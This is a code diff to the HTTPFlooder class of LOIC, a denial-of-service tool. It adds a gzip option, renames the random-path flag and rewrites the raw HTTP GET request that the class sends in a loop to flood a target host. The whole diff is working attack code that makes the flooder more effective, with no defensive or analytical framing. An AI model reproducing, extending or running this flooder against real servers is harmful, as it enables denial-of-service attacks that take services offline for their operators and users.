@@ -8,8 +8,8 @@ namespace LOIC
 {
 	public class HTTPFlooder
 	{
+		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
 		public ReqState State = ReqState.Ready;
-
 		public int Downloaded;
 		public int Requested;
 		public int Failed;
@@ -22,13 +22,11 @@ namespace LOIC
 		public int Timeout;
 		public bool Resp;
 		private System.Windows.Forms.Timer tTimepoll = new System.Windows.Forms.Timer();
-
 		private long LastAction;
-		private Random rnd = new Random();
-		private bool random;
-		public enum ReqState { Ready, Connecting, Requesting, Downloading, Completed, Failed };
+		private bool AllowRandom;
+		private bool AllowGzip;
 
-		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random)
+		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool gzip)
 		{
 			this.Host = host;
 			this.IP = ip;
@@ -37,7 +35,8 @@ namespace LOIC
 			this.Resp = resp;
 			this.Delay = delay;
 			this.Timeout = timeout;
-			this.random = random;
+			this.AllowRandom = random;
+			this.AllowGzip = gzip;
 		}
 		public void Start()
 		{
@@ -67,7 +66,7 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{3}Host: {2}{3}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){3}Accept: */*{3}{3}{3}", Subsite, ( random ? new Functions().RandomString() : null ), Host, Environment.NewLine));
+				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{4}Accept: */*{4}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){4}{3}{4}Host: {2}{4}{4}{4}", Subsite, ( AllowRandom ? new Functions().RandomString() : null ), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" : null),Environment.NewLine));
 				IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
